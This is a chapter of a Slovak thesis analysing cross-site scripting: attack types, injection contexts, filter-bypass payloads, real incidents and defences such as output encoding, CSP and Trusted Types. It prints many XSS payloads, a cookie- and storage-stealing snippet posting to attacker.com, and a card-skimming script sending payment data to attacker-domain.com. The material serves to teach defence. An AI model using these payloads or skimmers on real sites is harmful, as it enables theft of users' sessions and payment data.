\chapter{Analýza problému}

\section{Úvod do problematiky XSS}

Cross-Site Scripting (XSS) je jednou z najrozšírenejších zraniteľností webových aplikácií, ktorá umožňuje útočníkovi vkladať škodlivý skript do webových stránok zobrazovaných inými používateľmi. Tento typ útoku môže viesť k odcudzeniu citlivých informácií, manipulácii s obsahom stránky alebo prevzatiu kontroly nad používateľskou reláciou. Podľa štúdie \parencite{rodriguez2019xss} až 40\,\% všetkých útokov na webové aplikácie súvisí s XSS, čo podčiarkuje závažnosť tejto problematiky.

Mechanizmus útoku spočíva v tom, že aplikácia prijme vstup od používateľa (napr. cez formulár alebo URL) a bez dôkladného ošetrenia ho vloží do výstupného HTML. Prehliadač následne spustí vložený skript ako súčasť aplikácie, čím útočník získava možnosť ovládať správanie aplikácie z pohľadu obete \parencite{gupta2011xssds}.

\section{Historický kontext a evolúcia XSS útokov}

Cross-Site Scripting patrí medzi najstaršie známe webové zraniteľnosti. Prvýkrát bol tento typ útoku zdokumentovaný v roku 1999 v bulletine od Microsoft Security Response Center \parencite{klein2005dombasedxss}. Názov \textit{Cross-Site Scripting} vznikol v dobe, keď táto zraniteľnosť bola primárne využívaná na vkladanie skriptov z jednej domény do kontextu inej domény.

V raných 2000s rokoch, keď vznikali prvé webové aplikácie s dynamickým obsahom, nebolo povedomie o XSS takmer žiadne. Vývojári často používali priamy výstup používateľských vstupov bez akéhokoľvek ošetrenia. Štúdia z roku 2007 ukázala, že 68\,\% testovaných webových stránok bolo zraniteľných voči základným XSS útokom \parencite{grossman2007xss}.

\subsection{Evolúcia útočných techník}

\textbf{Fáza 1 (1999--2005): Základné útoky}

Prvé XSS útoky boli relatívne primitívne, najčastejšie využívajúce \texttt{<script>} značky v URL parametroch alebo formulároch \parencite{vogt2007cross}. Príklad typického útočného kódu z tohto obdobia:

\begin{lstlisting}[language=HTML, caption={URL utok cez search parameter}, label={lst:url-tok-cez-search-parameter-1}]
http://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>
\end{lstlisting}

\textbf{Fáza 2 (2006--2012): Sofistikované techniky obchádzania}

S nárastom povedomia o XSS sa začali implementovať základné obranné mechanizmy, čo viedlo k vývoju techník na ich obchádzanie \parencite{pelizzi2012analyzing}. Vznikli databázy XSS útočných kódov ako \textit{XSS Cheat Sheet} od RSnake, ktoré obsahovali stovky variácií. Príklady zahŕňali:

\begin{itemize}
  \item Používanie alternatívnych značiek:
        \begin{lstlisting}[language=HTML, caption={URL utok cez search parameter}, label={lst:url-tok-cez-search-parameter-1}]
      <img src=x onerror=alert(1)>
    \end{lstlisting}
  \item Zahmliavanie kódovaním:
        \begin{lstlisting}[language=HTML, caption={URL utok cez search parameter}, label={lst:url-tok-cez-search-parameter-1}]
      <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
    \end{lstlisting}
  \item Obsluhy udalostí:
        \begin{lstlisting}[language=HTML, caption={URL utok cez search parameter}, label={lst:url-tok-cez-search-parameter-1}]
      <body onload=alert(1)>
    \end{lstlisting}
\end{itemize}

\textbf{Fáza 3 (2013--2020): DOM-based a mutation XSS}

S nástupom jednostránkových aplikácií a náročného vykresľovania na strane klienta sa zameranie presunulo na DOM-based XSS \parencite{klein2005dombasedxss}. Výskumníci ako Heiderich et al.\ \parencite{heiderich2013mxss} objavili mutation XSS (mXSS), kde dezinfekcia na strane servera je obídená cez mutácie v prehliadači.

\textbf{Fáza 4 (2021--súčasnosť): XSS v moderných frameworkoch}

Súčasná éra sa vyznačuje úsilím o elimináciu XSS na úrovni frameworkov. React, Angular a Vue.js implementovali automatické znefunkčňovanie \parencite{weinberger2011systematic}. Vznikli bezpečnostné štandardy ako Trusted Types API \parencite{w3c2023trustedtypes}, ktoré sa snažia XSS riešiť na úrovni webovej platformy samotnej.

\section{Typy XSS útokov}

\subsection{Reflected XSS}

Reflected XSS je typ útoku, kde škodlivý kód nie je uložený na serveri, ale je vrátený obeti prostredníctvom HTTP požiadavky \parencite{hydara2015current}. Tento typ útoku sa často využíva prostredníctvom URL, emailov alebo iných komunikačných kanálov, kde útočník dokáže presvedčiť obeť, aby klikla na špeciálne upravený odkaz.

Keď obeť klikne na takýto odkaz, skript je odoslaný na server ako časť požiadavky a server ho vráti ako súčasť odpovede bez toho, aby ho dostatočne overil alebo zakódoval. Prehliadač obete potom vykoná tento skript s rovnakými oprávneniami, aké má legitímna stránka. Tak môže útočník získať prístup k citlivým údajom, ako sú súbory cookie alebo iné údaje uložené v prehliadači \parencite{pelizzi2012analyzing}.

\textbf{Prevencia proti Reflected XSS:}

Prevencia zahŕňa dôkladné overovanie a znefunkčnenie vstupov a výstupov \parencite{owasp2023cheatsheet}. Všetky údaje, ktoré sú dynamicky generované a odoslané ako súčasť HTTP odpovede, by mali byť znefunkčnené, aby sa predišlo spusteniu vloženého skriptu. Okrem toho je užitočné používať bezpečnostné hlavičky, ako je Politika bezpečnosti obsahu (CSP) \parencite{stamm2010reining}, ktoré môžu pomôcť obmedziť zdroje, z ktorých prehliadač môže načítavať a vykonávať skripty.

\subsection{Stored XSS}

Stored XSS, známy aj ako perzistentný XSS, je nebezpečnejší ako Reflected XSS, pretože škodlivý skript je uložený na serveri a je doručený všetkým používateľom, ktorí si zobrazia infikovanú stránku \parencite{hydara2015current}. Tento typ útoku sa obvykle vyskytuje v aplikáciách, ktoré umožňujú používateľom odosielať údaje, ako sú komentáre, príspevky na fórach alebo používateľské profily.

Keď útočník vloží škodlivý skript do takéhoto vstupu a server ho uloží bez adekvátnej dezinfekcie vstupu, skript sa stane súčasťou stránky a bude vykonaný v prehliadači každého používateľa, ktorý si stránku zobrazí. Tento útok môže byť použitý na krádež súborov cookie, šírenie škodlivého softvéru, alebo manipuláciu s webovou aplikáciou \parencite{johns2007xssdefender}.

\textbf{Prevencia proti Stored XSS:}

Prevencia zahŕňa dôkladnú dezinfekciu používateľských vstupov pri ich uložení aj pri ich zobrazení \parencite{samuel2011context}. Všetky používateľské vstupy by mali byť považované za potenciálne nebezpečné a mali by byť ošetrené podľa kontextu, v ktorom budú použité. Okrem toho, aplikácia by mala používať hlavičky ako Politika bezpečnosti obsahu (CSP) \parencite{weichselbaum2016csp} na obmedzenie možností spustenia škodlivého kódu.

\subsection{DOM-based XSS}

DOM-based XSS je útok, ktorý vzniká na strane klienta, keď skript manipuluje Document Object Model (DOM) spôsobom, ktorý spustí škodlivý kód \parencite{klein2005dombasedxss}. Tento typ útoku nevyžaduje, aby bol škodlivý kód uložený na serveri alebo poslaný ako súčasť odpovede. Namiesto toho sa zneužíva spôsob, akým JavaScript na stránke manipuluje s DOM.

Útočník môže zmeniť určité časti DOM, ako sú URL fragmenty, ktoré sú potom použité v skriptoch na stránke. Ak tieto skripty neoverujú vstup dostatočne, môžu vykonať škodlivý kód v prehliadači obete \parencite{stock2014precise}. Tento útok je často ťažšie detekovať, pretože sa vyskytuje úplne na strane klienta bez interakcie so serverom.

\textbf{Prevencia proti DOM-based XSS:}

Prevencia zahŕňa dôkladné overovanie a znefunkčnenie všetkých vstupov, ktoré sú použité na manipuláciu s DOM \parencite{melicher2018evalguard}. JavaScript by mal manipulovať s DOM bezpečne a používať bezpečné metódy na vloženie používateľských údajov. Okrem toho, používanie Politiky bezpečnosti obsahu môže pomôcť obmedziť možnosť spustenia škodlivého kódu z iných zdrojov \parencite{stamm2010reining}.

\subsection{Mutation XSS (mXSS)}

Mutation XSS je relatívne nový typ útoku objavený výskumníkmi Heiderichom et al.\ \parencite{heiderich2013mxss} v roku 2013. Tento útok využíva rozdiel medzi tým, ako server analyzuje HTML a ako ho analyzuje prehliadač, čo vedie k \textit{mutácii} dezinfikovaného obsahu späť na nebezpečný kód.

\textbf{Príklad mXSS útoku:}

\begin{lstlisting}[language=HTML, caption={Priklad mutation XSS utoku}, label={lst:pr-klad-mutation-xss-toku-2}]
<!-- Server vidi a dezinfikuje: -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Prehliadac po analyzovani vytvori: -->
<noscript><p title="</noscript>
<img src=x onerror=alert(1)>
">
\end{lstlisting}

Tento typ útoku je obzvlášť nebezpečný, pretože obchádza dezinfekciu na strane servera zneužívaním rozdielov v logike analyzovania HTML medzi dezinfekčným programom a prehliadačom \parencite{heiderich2013mxss}.

\subsection{Self-XSS a sociálne inžinierstvo}

Self-XSS je technika, kde útočník presvedčí obeť, aby do svojho vlastného prehliadača (napr. do Konzoly pre vývojárov) vložila škodlivý JavaScript kód. Hoci technicky nie je toto klasický XSS útok (keďže vyžaduje aktívnu účasť obete), predstavuje významnú hrozbu vďaka taktikám sociálneho inžinierstva.

\textbf{Typický scenár Self-XSS útoku:}

\begin{enumerate}
  \item Útočník vytvorí phishing stránku alebo príspevok na sociálnej sieti
  \item Ponúka obeti \textit{„skvelý hack"} alebo \textit{„bezplatné funkcie"}
  \item Inštruuje obeť otvoriť Konzolu pre vývojárov (F12)
  \item Obeť skopíruje a spustí škodlivý JavaScript
\end{enumerate}

\textbf{Príklad škodlivého kódu:}

\begin{lstlisting}[language=JavaScript, caption={Skodlivy JavaScript kod}, label={lst:kodliv-javascript-k-d-3}]
// "Bezplatni sledovatelia na Instagrame"
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: localStorage,
    sessionStorage: sessionStorage
  })
});
\end{lstlisting}

Významné platformy ako Facebook implementovali ochranu vložením varovných správ do Konzoly pre vývojárov:

\begin{lstlisting}[caption={Varovanie v Developer Console}, label={lst:varovanie-v-developer-console-4}]
%c Stop!
%c Toto je funkcia prehliadaca urcena pre vyvojarov.
%c Ak vam niekto povedal, aby ste sem nieco skopirovali a vlozili,
   je to podvod a umozni to utocnikovi pristup k vasmu uctu.
\end{lstlisting}

\section{Technická anatómia XSS útoku}

Pre efektívnu obranu proti XSS je potrebné pochopiť jeho technickú anatómiu \parencite{rodriguez2019xss}. Každý XSS útok pozostáva z troch kľúčových komponentov: bodu vloženia, útočného kódu a kontextu vykonávania.

\subsection{Body vloženia a útočné kódy}

\textbf{Bod vloženia} je miesto v aplikácii, kde útočník môže vložiť svoje dáta \parencite{hydara2015current}. Najčastejšie typy:

\textbf{1. URL parametre:}
\begin{lstlisting}[language=HTML, caption={Priklad URL s utocnym kodom}, label={lst:pr-klad-url-s-to-n-m-k-dom-5}]
https://example.com/profile?name=<utocny_kod>
\end{lstlisting}

\textbf{2. Formulárové polia:}
\begin{lstlisting}[language=HTML, caption={Utok cez formularove pole}, label={lst:tok-cez-formul-rov-pole-6}]
<form method="POST">
  <input name="comment" value="<script>alert(1)</script>">
</form>
\end{lstlisting}

\textbf{3. HTTP hlavičky:}
\begin{lstlisting}[caption={XSS cez User-Agent hlavicku}, label={lst:xss-cez-user-agent-hlavi-ku-7}]
User-Agent: <script>alert(document.cookie)</script>
Referer: javascript:alert(1)
\end{lstlisting}

\textbf{4. Cookie hodnoty:}
\begin{lstlisting}[language=JavaScript, caption={XSS cez modifikaciu cookies}, label={lst:xss-cez-modifik-ciu-cookies-8}]
document.cookie = "lang=<img src=x onerror=alert(1)>";
\end{lstlisting}

\subsection{Kontexty vykonávania}

Rovnaký útočný kód môže fungovať alebo zlyhať v závislosti od \textit{kontextu}, v ktorom je vložený \parencite{samuel2011context}. Identifikácia kontextu je kritická pre úspešný útok aj obranu.

\textbf{1. HTML kontext:}
\begin{lstlisting}[language=HTML, caption={Kontext tela HTML}, label={lst:kontext-tela-html-9}]
<!-- Vlozenie do tela HTML -->
<div>Meno pouzivatela: VSTUP_MIESTO</div>

<!-- Utok: -->
<div>Meno pouzivatela: <img src=x onerror=alert(1)></div>
\end{lstlisting}

\textbf{2. Atribút kontext:}
\begin{lstlisting}[language=HTML, caption={Kontext HTML atributu}, label={lst:kontext-html-atrib-tu-10}]
<!-- Vlozenie do atributu -->
<input value="VSTUP_MIESTO">

<!-- Utok: -->
<input value="" onfocus="alert(1)" autofocus="">
\end{lstlisting}

\textbf{3. JavaScript kontext:}
\begin{lstlisting}[language=HTML, caption={Kontext JavaScript kodu}, label={lst:kontext-javascript-k-du-11}]
<!-- Vlozenie do JS retazca -->
<script>
  var userName = 'VSTUP_MIESTO';
</script>

<!-- Utok: -->
<script>
  var userName = ''; alert(1); //';
</script>
\end{lstlisting}

\textbf{4. URL kontext:}
\begin{lstlisting}[language=HTML, caption={Kontext href atributu}, label={lst:kontext-href-atrib-tu-12}]
<!-- Vlozenie do href -->
<a href="VSTUP_MIESTO">Kliknite tu</a>

<!-- Utok: -->
<a href="javascript:alert(1)">Kliknite tu</a>
\end{lstlisting}

\textbf{5. CSS kontext:}
\begin{lstlisting}[language=HTML, caption={Kontext CSS}, label={lst:kontext-css-13}]
<!-- Vlozenie do CSS -->
<style>
  body { background: VSTUP_MIESTO; }
</style>

<!-- Utok: -->
<style>
  body { background: url('javascript:alert(1)'); }
</style>
\end{lstlisting}

\subsection{Pokročilé útočné techniky}

\textbf{1. Polyglot XSS:}
Polyglot je útočný kód, ktorý funguje vo viacerých kontextoch súčasne \parencite{lekies2015code}:

\begin{lstlisting}[language=HTML, caption={Polyglot XSS kod}, label={lst:polyglot-xss-k-d-14}]
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
\end{lstlisting}

Tento polyglot funguje v:
\begin{itemize}
  \item HTML kontexte
  \item Atribút kontexte
  \item JavaScript kontexte
  \item URL kontexte
\end{itemize}

\textbf{2. Obchádzanie filtrov:}

Aplikácie často implementujú jednoduché filtre, ktoré môžu byť obídené \parencite{pelizzi2012analyzing}:

\begin{lstlisting}[language=HTML, caption={Technika obchadzania filtrov}, label={lst:technika-obch-dzania-filtrov-15}]
<!-- Filter blokuje "<script>" -->
<!-- Obidenie #1: Velke pismena -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Obidenie #2: HTML entity -->
<script>alert(1)</script>

<!-- Obidenie #3: Alternativne znacky -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Obidenie #4: JavaScript pseudo-protokol -->
<a href="javascript:alert(1)">klik</a>

<!-- Obidenie #5: Data URI -->
<object data="data:text/html,<script>alert(1)</script>">
\end{lstlisting}

\textbf{3. Kódovanie a zahmliavanie:}

Útočníci používajú rôzne kódovacie schémy na skrytie škodlivého kódu \parencite{lekies2015code}:

\begin{lstlisting}[language=HTML, caption={Kodovanie utocneho kodu}, label={lst:k-dovanie-to-n-ho-k-du-16}]
<!-- URL kodovanie -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- HTML entity kodovanie -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Unicode kodovanie -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Base64 -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

<!-- Hex kodovanie -->
<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')">

<!-- Octal kodovanie -->
<img src=x onerror="eval('\141\154\145\162\164\50\61\51')">
\end{lstlisting}

\textbf{4. Event handlery:}

Existuje viac ako 100 HTML atribútov, ktoré môžu spustiť JavaScript \parencite{whatwg2023html}:

\begin{lstlisting}[language=HTML, caption={Rozne event handlery}, label={lst:r-zne-event-handlery-17}]
<body onload=alert(1)>
<img src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<body oninput=alert(1)><input autofocus>
\end{lstlisting}

\subsection{Reálne príklady útokov}

\textbf{Prípad 1: Twitter Worm (2009):}

V roku 2009 sa šíril červ na Twitteri využívajúci Stored XSS zraniteľnosť. Útok fungoval takto:

\begin{lstlisting}[language=JavaScript, caption={Twitter XSS worm}, label={lst:twitter-xss-worm-18}]
// Zranitelnost: Twitter nespravne znefunkcnoval onmouseover
<div onmouseover="
  // Skopiruj tento tweet do profilu obete
  $.post('/status/update', {
    status: document.getElementById('payload').innerHTML
  });
">Prejdite mysou sem!</div>
\end{lstlisting}

Červ sa šíril exponenciálne -- každý, kto prešiel myšou cez infikovaný tweet, ho automaticky retweetol a infikoval svojich sledovateľov.

\textbf{Prípad 2: British Airways (2018):}

British Airways utrpela únik 380 000 záznamov platobných kariet cez XSS útok \parencite{britishairways2018}. Útočníci:

\begin{enumerate}
  \item Kompromitovali JavaScript knižnicu tretej strany používanú na platobnej stránke
  \item Vložili škodlivý skript, ktorý kradol údaje formulárov
  \item Exfiltrovali údaje na server útočníka
\end{enumerate}

\begin{lstlisting}[language=JavaScript, caption={Zjednodusena verzia utoku}, label={lst:zjednodu-en-verzia-toku-19}]
// Vlozeny skodlivy skript
(function() {
  const form = document.querySelector('form[name="payment"]');
  
  form.addEventListener('submit', function(e) {
    const data = {
      cardNumber: form.querySelector('[name="cardNumber"]').value,
      cvv: form.querySelector('[name="cvv"]').value,
      expiry: form.querySelector('[name="expiry"]').value
    };
    
    // Odoslat na server utocnika
    fetch('https://attacker-domain.com/collect', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
})();
\end{lstlisting}

Tento incident stál British Airways £20 milónov v pokute od ICO (Information Commissioner's Office) \parencite{britishairways2018}.

\textbf{Prípad 3: MySpace Samy Worm (2005):}

Jeden z najznámejších XSS červov v histórii. Samy Kamkar vytvoril samoreplikujúci sa XSS skript, ktorý:

\begin{lstlisting}[language=JavaScript, caption={Zjednodusena struktura Samy wormu}, label={lst:zjednodu-en-trukt-ra-samy-wormu-20}]
// Cerv ktory sa skopiroval do profilov
var payload = '<div id="mycode">' +
  'this script here' + // kod cerva
'</div>';

// Pridal utocnika ako priatela
xmlhttp.send('friend_id=11851658&action=add');

// Vlozil cerva do profilu obete
xmlhttp.send('profile_text=' + encodeURIComponent(payload));
\end{lstlisting}

Červ sa šíril exponenciálne -- za 20 hodín mal Samy viac ako 1 milión „priateľov" a MySpace musel vypnúť službu na odstránenie infekcie.

\section{Obranné mechanizmy a ich limitácie}

\subsection{Validácia a sanitizácia vstupov}

Validácia vstupov je prvou líniou obrany, ale má významné limitácie \parencite{owasp2023cheatsheet}.

\textbf{Prístup: Whitelist vs. Blacklist}

\textbf{Blacklist (zlý prístup):}
\begin{lstlisting}[language=JavaScript, caption={Priklad blacklist validacie}, label={lst:pr-klad-blacklist-valid-cie-21}]
function sanitize(input) {
  return input
    .replace(/<script>/gi, '')
    .replace(/javascript:/gi, '')
    .replace(/onerror/gi, '');
}

// Lahko obiditelne
sanitize('<scr<script>ipt>alert(1)</script>') 
// Vysledok: <script>alert(1)</script>
\end{lstlisting}

\textbf{Whitelist (lepší prístup):}
\begin{lstlisting}[language=JavaScript, caption={Priklad whitelist validacie}, label={lst:pr-klad-whitelist-valid-cie-22}]
function sanitizeUsername(input) {
  // Povolit iba alfanumericke znaky a podciarkovniky  
  return input.replace(/[^a-zA-Z0-9_]/g, '');
}

// Nemoze byt obidene XSS utokmi
sanitizeUsername('<script>alert(1)</script>')
// Vysledok: 'scriptalert1script'
\end{lstlisting}

\subsection{Kódovanie výstupov (Output Encoding)}

Kódovanie výstupov je najefektívnejšia obrana, ale musí byť kontextovo špecifické \parencite{samuel2011context}.

\textbf{1. HTML Entity Encoding:}
\begin{lstlisting}[language=JavaScript, caption={HTML entity kodovanie}, label={lst:html-entity-k-dovanie-23}]
function encodeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// Pouzitie:
const userInput = '<script>alert(1)</script>';
element.innerHTML = encodeHTML(userInput);
// Vysledok: &lt;script&gt;alert(1)&lt;/script&gt;
\end{lstlisting}

\textbf{2. JavaScript Encoding:}
\begin{lstlisting}[language=JavaScript, caption={JavaScript kodovanie}, label={lst:javascript-k-dovanie-24}]
function encodeJS(str) {
  return str
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t');
}

// Pouzitie:
const userInput = "'; alert(1); //";
const script = `var name = '${encodeJS(userInput)}';`;
// Vysledok: var name = '\'; alert(1); //';
\end{lstlisting}

\textbf{3. URL Encoding:}
\begin{lstlisting}[language=JavaScript, caption={URL kodovanie}, label={lst:url-k-dovanie-25}]
function encodeURL(str) {
  return encodeURIComponent(str);
}

// Pouzitie:
const userInput = 'javascript:alert(1)';
const url = `/search?q=${encodeURL(userInput)}`;
// Vysledok: /search?q=javascript%3Aalert(1)
\end{lstlisting}

\subsection{Content Security Policy (CSP)}

CSP je mocný obranný mechanizmus, ktorý obmedzuje, odkiaľ môžu byť načítané zdroje \parencite{stamm2010reining}.

\textbf{Základná CSP konfigurácia:}
\begin{lstlisting}[caption={Zakladny CSP header}, label={lst:z-kladn-csp-header-26}]
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
\end{lstlisting}

\textbf{Prísnejšia CSP s nonces:}
\begin{lstlisting}[caption={CSP s nonce hodnotami}, label={lst:csp-s-nonce-hodnotami-27}]
Content-Security-Policy: 
  script-src 'nonce-{random}';
  style-src 'nonce-{random}';
\end{lstlisting}

\begin{lstlisting}[language=HTML, caption={HTML s nonce}, label={lst:html-s-nonce-28}]
<!-- Server generuje nahodny nonce pre kazdu poziadavku -->
<script nonce="2726c7f26c">
  // Tento skript je povoleny
  console.log('Ahoj');
</script>

<script>
  // Tento skript je zablokovany lebo chyba nonce
  console.log('Blokovane');
</script>
\end{lstlisting}

\textbf{Limitácie CSP:}

Napriek svojej sile má CSP významné limitácie \parencite{weichselbaum2016csp}:

\begin{enumerate}
  \item \textbf{Whitelisting CDN:} Ak je povolený CDN, útočník môže zneužiť knižnice z tohto CDN
  \item \textbf{JSONP endpoints:} Povolené domény s JSONP môžu byť zneužité
  \item \textbf{`unsafe-inline':} Ak je povolený, CSP je takmer zbytočný
  \item \textbf{Adoptácia:} Iba 10\,\% webov používa CSP \parencite{weichselbaum2016csp}
\end{enumerate}

\subsection{HttpOnly a Secure cookies}

HttpOnly flag zabraňuje prístupu k cookies cez JavaScript \parencite{west2016samesite}:

\begin{lstlisting}[caption={Nastavenie HttpOnly cookies}, label={lst:nastavenie-httponly-cookies-29}]
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
\end{lstlisting}

\textbf{Účinok:}
\begin{lstlisting}[language=JavaScript, caption={Pokus o pristup k HttpOnly cookie}, label={lst:pokus-o-pr-stup-k-httponly-cookie-30}]
// Utok XSS:
console.log(document.cookie); 
// Vysledok: "" (prazdny string, sessionId nie je viditelny)
\end{lstlisting}

\textbf{SameSite atribút} zabraňuje CSRF útokom \parencite{west2016samesite}:
\begin{itemize}
  \item \texttt{SameSite=Strict}: Cookie je poslaný iba pri požiadavkach z tej istej stránky
  \item \texttt{SameSite=Lax}: Cookie je poslaný pri top-level navigácii
  \item \texttt{SameSite=None}: Cookie je poslaný vždy (vyžaduje \texttt{Secure})
\end{itemize}

\subsection{Moderné frameworky a automatická ochrana}

\textbf{React:}

React automaticky znefunkčňuje obsah v JSX \parencite{weinberger2011systematic}:

\begin{lstlisting}[language=JavaScript, caption={React automaticke znefunkcnenie}, label={lst:react-automatick-znefunk-nenie-31}]
// BEZPECNE: React automaticky znefunkcnuje
const userInput = '<img src=x onerror=alert(1)>';
return <div>{userInput}</div>;
// Vykresli: &lt;img src=x onerror=alert(1)&gt;

// NEBEZPECNE: dangerouslySetInnerHTML obchadza ochranu
return <div dangerouslySetInnerHTML={{__html: userInput}} />;
// Vykresli: <img src=x onerror=alert(1)>
\end{lstlisting}

\textbf{Angular:}

Angular má zabudovaný DomSanitizer:

\begin{lstlisting}[language=TypeScript, caption={Angular DomSanitizer}, label={lst:angular-domsanitizer-32}]
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

// BEZPECNE: Angular automaticky znefunkcnuje
template = '<img src=x onerror=alert(1)>';

// Ak chcete doverovat HTML:
trustedHtml = this.sanitizer.sanitize(SecurityContext.HTML, this.template);
\end{lstlisting}

\textbf{Vue.js:}

Vue tiež automaticky znefunkčňuje:

\begin{lstlisting}[language=HTML, caption={Vue znefunkcnenie}, label={lst:vue-znefunk-nenie-33}]
<!-- BEZPECNE: Automaticky znefunkcnene -->
<div>{{ userInput }}</div>

<!-- NEBEZPECNE: v-html obchadza ochranu -->
<div v-html="userInput"></div>
\end{lstlisting}

\subsection{Trusted Types API}

Trusted Types je nový webový štandard, ktorý sa snaží riešiť XSS na úrovni platformy \parencite{w3c2023trustedtypes}:

\begin{lstlisting}[language=JavaScript, caption={Pouzitie Trusted Types}, label={lst:pou-itie-trusted-types-34}]
// Vytvorenie politiky
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (string) => {
    // Dezinfikuj tu
    return sanitizeHTML(string);
  },
  createScriptURL: (string) => {
    // Validuj URL tu
    if (string.startsWith('https://trusted-cdn.com/')) {
      return string;
    }
    throw new TypeError('Nepovoleny script URL');
  }
});

// Pouzitie:
const userInput = '<img src=x onerror=alert(1)>';
element.innerHTML = policy.createHTML(userInput); // Bezpecne
element.innerHTML = userInput; // Chyba v prehliadacoch s Trusted Types
\end{lstlisting}

\textbf{Aktivácia Trusted Types:}
\begin{lstlisting}[caption={CSP header pre Trusted Types}, label={lst:csp-header-pre-trusted-types-35}]
Content-Security-Policy: 
  require-trusted-types-for 'script';
  trusted-types myPolicy default;
\end{lstlisting}

\subsection{Detekcia a blokovanie na úrovni prehliadača}

Prehliadače implementujú vstavané XSS filtre, ale ich účinnosť je obmedzená \parencite{pelizzi2012analyzing}:

\textbf{Chrome XSS Auditor (deprecated v 2019):}
\begin{itemize}
  \item Heuristicky detegoval reflected XSS
  \item Mal mnoho false positives
  \item Mohol byť obídený
\end{itemize}

\textbf{Edge SmartScreen:}
\begin{itemize}
  \item Deteguje škodlivé URL
  \item Chráni pred phishingom
  \item Nie je špecificky zameraný na XSS
\end{itemize}

\section{Ekonomický a organizačný dopad XSS}

\subsection{Náklady na únik dát}

Priemerné náklady na únik dát podľa IBM Security \parencite{ibm2023databreach}:

\begin{itemize}
  \item \textbf{Globálny priemer:} \$4.24M na incident
  \item \textbf{Zdravotníctvo:} \$9.23M (najvyššie)
  \item \textbf{Finančný sektor:} \$5.72M
  \item \textbf{Technológie:} \$4.97M
  \item \textbf{Retail:} \$3.28M
\end{itemize}

\textbf{Rozdelenie nákladov:}
\begin{itemize}
  \item Detekcia a eskalácia: 29\,\%
  \item Notifikácia: 7\,\%
  \item Reakcia po incidente: 27\,\%
  \item Strata podnikania: 37\,\%
\end{itemize}

\subsection{GDPR a regulačné pokuty}

Podľa GDPR \parencite{gdpr2016regulation} môžu byť firmy pokutované až:
\begin{itemize}
  \item €20M alebo 4\,\% globálneho ročného obratu (čo je vyššie)
  \item British Airways: £20M pokuta za XSS únik v roku 2018 \parencite{britishairways2018}
  \item Marriott: £18.4M za únik dát
\end{itemize}

\textbf{Dodatočné náklady podľa štúdie Forrester \parencite{forrester2022security}:}
\begin{itemize}
  \item Strata dôvery zákazníkov: 31\,\% pokles transakčného objemu
  \item Strata brand value: priemerne 8\,\% pokles trhovej kapitalizácie
  \item Právne náklady: priemerne \$1.2M
  \item Zvýšenie insurance premiums: 20-50\,\%
\end{itemize}

\subsection{ROI preventívnych opatrení}

Gartner \parencite{gartner2023security} odhaduje návratnosť investícií do preventívnych bezpečnostných opatrení:

\begin{itemize}
  \item \textbf{Náklady na prevenciu:} \$200K-\$500K ročne (stredná firma)
        \begin{itemize}
          \item Bezpečnostné školenia vývojárov
          \item SAST/DAST nástroje
          \item Bezpečnostné code reviews
          \item Penetračné testovanie
        \end{itemize}

  \item \textbf{Úspory:} \$2M-\$5M (pri prevencii jedného major incidentu)
  \item \textbf{ROI:} 4:1 až 10:1
\end{itemize}

\section{Prečo je XSS stále problém?}

Napriek viac ako 20 rokom povedomia zostáva XSS jednou z top 3 zraniteľností \parencite{owasp2021top10}. Prečo?

\subsection{Komplexnosť moderných aplikácií}

Moderná webová aplikácia je nepreberná zmes technológií \parencite{stackoverflow2023survey}:

\begin{lstlisting}[language=JavaScript, caption={Typicky tech stack}, label={lst:typick-tech-stack-52}]
// Frontend
React/Vue/Angular + TypeScript
Webpack/Vite bundler
50+ npm zavislosti

// Backend  
Node.js/Python/PHP/Java
REST/GraphQL API
10+ third-party integracie

// Infrastruktura
Docker/Kubernetes
CDN (Cloudflare/Akamai)
Multiple microservices
\end{lstlisting}

Každá vrstva zavádza potenciálne bezpečnostné riziká.

\subsection{Legacy kód a technický dlh}

Štúdia WhiteSource \parencite{whitesource2022legacy}:
\begin{itemize}
  \item 67\,\% organizácií má kód starší ako 10 rokov
  \item 85\,\% legacy systémov nemá pravidelné bezpečnostné audity
  \item Priemerný čas na opravu zraniteľnosti: 38 dní (ale v legacy systémoch: 120+ dní)
\end{itemize}

\begin{lstlisting}[language=PHP, caption={Typicky legacy PHP kod}, label={lst:typick-legacy-php-k-d-53}]
<!-- Napisany v 2008, stale v produkcii v 2024 -->
<?php
  // Ziadne osetrenie vstupov!
  $search = $_GET['q'];
  echo "Vysledky pre: " . $search;
?>
\end{lstlisting}

